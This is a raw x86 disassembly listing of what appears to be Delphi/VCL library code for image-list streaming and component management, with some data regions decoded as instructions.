mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_427294
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fd18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424e90
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fd86
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_427294
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_44fd9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44fe08
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe0f
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44fe3c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4246e8
mov si 0xffff
call sub_4483f8
inc ebp
dec edi
jne r-xdata
sub_44fe8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4245dc
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4246e8
cmp ebp eax
jne r-xdata
sub_44fee4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_434e78
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44ff28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44f6d8
mov ebx eax
mov eax edi
call sub_44f6d8
cmp ebx eax
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44f6d8
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450004
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ffe7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44fee4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffee
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
mov eax edi
call sub_44f6d8
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_450018
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44f6d8
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44ff28
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_450074
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_42e610
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_450018
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4500d8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax esi
call sub_4274c8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax esi
call sub_4274c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45035c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_427274
mov ebx eax
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x18 ]
add eax ebx
cdq
push edx
push eax
mov eax esi
call sub_427294
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45033f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4728c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_422fe4
mov eax [ ebp - 0x4 ]
call sub_450754
xor eax eax
push ebp
push sub_450322
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450329
mov eax [ ebp - 0xc ]
call sub_4481b0
mov eax [ ebp - 0x14 ]
call sub_4481b0
mov eax [ ebp - 0x4 ]
call sub_450758
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_42300c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4719a8
push eax
mov eax [ ebp - 0xc ]
call sub_4719a8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_46e1cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_42300c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4719a8
push eax
mov eax [ ebp - 0x14 ]
call sub_4719a8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_46e1cc
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f60c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45036c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ed94
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4503cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4503d3
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub eax 0xffffffec
sub_4503d3
mov eax [ ebp - 0x4 ]
call sub_44f2fc
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450503
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_427294
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_427a48
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_427294
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_427294
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ed94
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4504e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_427294
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub eax 0xffffffec
movzx eax [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_427294
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_450534
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44f530
mov eax edi
call sub_427274
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
movzx ebx [ esp ]
movzx eax [ esp ]
shr eax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_427294
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4500d8
cmp bl 0x49
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f4cc
push eax
call ImageList_GetImageCount
push eax
mov eax esi
call sub_44f4cc
push eax
call ImageList_SetImageCount
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45036c
jmp r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
jne r-xdata
sub_4505e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ed94
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4506de
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_43a810
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleW
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44f4cc
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44f4cc
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call sub_41d36c
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4506e5
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
jmp r-xdata
sub_450778
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
mov edx esi
call sub_44fe8c
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4507c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4507e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507f0
retn
sub_450bca
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add al bh
out 0x42 al
add [ eax - 0x14 ] cl
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + 0x8004514 ] dh
in eax dx
inc edx
add [ esp + ebp * 8 - 0x13bfffbe ] ch
inc edx
add [ eax - 0x14 ] dh
inc edx
add [ esp + ebp * 8 + 0x42 ] al
add [ eax + 0xf ] al
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_450ca4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeae40042 0x42
inc ebp
add [ eax + eax ] bl
add [ eax ] al
sub al 0x2e
inc edx
add [ edx + eax * 4 + 0x44 ] ch
sub_450d14
mov bl ch
inc edx
add [ eax - 0x33ffbaed ] bh
adc eax [ ebp ]
loopne r-xdata
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add [ esp + edx + 0x45 ] ch
add [ eax - 0x7bffbaec ] al
adc al 0x45
add [ eax - 0x73ffbaec ] cl
adc al 0x45
add [ eax - 0x6bffbaec ] dl
adc al 0x45
add [ eax - 0x63ffbaec ] bl
adc al 0x45
add [ eax - 0x5bffbaec ] ah
adc al 0x45
add [ eax - 0x53ffbaec ] ch
adc al 0x45
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb9e85653
jns r-xdata
inc ebp
add ah dh
adc eax [ ebp ]
or [ eax * 2 + 0x45141c00 ] dl
add [ eax ] dh
adc al 0x45
add [ esp + edx + 0x45 ] al
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42ebd8
test bl bl
jle r-xdata
mov edx esi
call sub_4511a0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_450d7c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42ebd8
test bl bl
jle r-xdata
mov edx esi
call sub_4511a0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_450dec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42e708
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_450e94
sub_450e20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450db0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4245dc
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_424768
sub_450e68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_449d2c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_450e94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4511a0
mov edx ebx
mov eax esi
call sub_451180
sub_450ebc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_450e94
sub_450ee8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_483cdc
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4483f8
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42ec74
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_48a798
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450f40
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_483d04
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4483f8
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42ec90
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_48a798
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450f98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_451124
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_451004
push ebx
push esi
push edi
call sub_44873c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4481b0
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4247d4
call sub_4481b0
lea eax [ edi + 0x30 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_42e2c4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4486e4
sub_45105c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4510a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424744
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov edx edi
call sub_450e20
sub_4510f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44fe8c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_42e354
sub_451130
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42e5b0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_4511a0
sub_451180
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424590
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_42e354
pop esi
pop ebx
retn
sub_4511a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4248a0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_42e594
xor eax eax
mov [ esi + 0x5c ] eax
sub_4511c8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x2a8 ] 0x0
je r-xdata
mov eax [ esi + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_451230
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
call sub_46798c
test al al
jne r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
call sub_476ee8
mov ebx eax
movzx eax [ esi + 0x4 ]
mov edx ebx
call sub_4622ec
mov ebp eax
test bp bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esp + 0x4 ] al
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_451c74
mov edx ebp
call sub_451d2c
inc eax
je r-xdata
sub_4512d4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4512f4
push ebx
push ecx
